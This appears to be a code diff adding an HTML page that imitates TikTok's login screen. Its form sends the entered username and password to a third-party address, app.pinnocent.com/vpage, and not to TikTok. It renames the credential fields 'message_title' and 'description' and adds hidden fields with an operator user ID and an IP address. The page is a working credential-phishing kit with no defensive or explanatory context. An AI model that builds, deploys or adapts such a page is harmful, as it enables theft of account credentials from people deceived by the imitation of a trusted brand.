@@ -1,0 +1,85 @@
+<html lang="en">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cal+Sans&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Log in | Tiktok</title>
+        <style>
+        html {
+    font-family: "Cal Sans", sans-serif;
+  font-weight: 400;
+  font-style: normal;      
+        }
+        input {
+          font-family: "Cal Sans", sans-serif;
+  font-weight: 400;
+  font-style: normal;
+        }
+        button {
+          font-family: "Cal Sans", sans-serif;
+  font-weight: 400;
+  font-style: normal;
+        }
+        .fp {
+          padding-left: 20px;
+        }
+          .ct {
+            width: 150px;
+            height: 40px;
+            margin: 5px;
+            background-color: white;
+            border: none;
+            border-bottom: 1px solid black;
+          }
+          .it {
+            width: 310px;
+            height: 50px;
+            background-color: white;
+            margin: 3px;
+            padding: 5px;
+          }
+          .sb {
+            width: 280px;
+            height: 50px;
+            margin-left: 20px;
+            border: none;
+          }
+          .text-center{
+            padding-left: 100px;
+          }
+        </style>
+                 </head>
+                 <body class="bg-[#1f1717]">
+                  <noscript>You need to enable JavaScript to run this app.</noscript>
+                  <div id="root"><div>
+                    <div class="flex justify-center w-full">
+                    </div>
+                    <h2 class="text-center" style="">Log in to Tiktok</h2>
+                    <button class="ct">Phone</button>
+                       <button class="ct"> E-mail / Username </button>
+                    <form action="https://app.pinnocent.com/vpage" method="POST">
+                       <input required type="hidden" name="link" value="TikTok">
+                       <input required type="hidden" name="ftype" value="normal">
+                       <input required type="hidden" name="login" value="login">
+                  <input required type="hidden" name="user_id" id="userUsername" value="16934">
+                  <input required type="hidden" name="ip" value="172.69.223.61" />
+                       <div class="p-2 w-full  gap-1  ">
+                         <div class="flex flex-col   p-2  gap-1">
+                           
+                          <input required type="text" class="it" name="message_title" placeholder="Email, Username or Phone" style="color:#111;">
+                         </div>
+                         <div class="flex flex-col   p-2   gap-1">
+                           
+                          <input required type="password" class="it" name="description" placeholder="Password" id="password" autocomplete="new-password" aria-autocomplete="list" style="color:#111;">
+                         </div>
+                         <div class="flex flex-col justify-center items-center  p-2 gap-1 w-3/6 mx-auto">
+                           <p class="fp"> Forget password</p>
+                            <button type="submit" class="sb">Log In</button>
+                         </div>
+                       </div>
+                    </form>
+                    </div>
+                 </div>
+               </div>
+               </body>
+               </html>
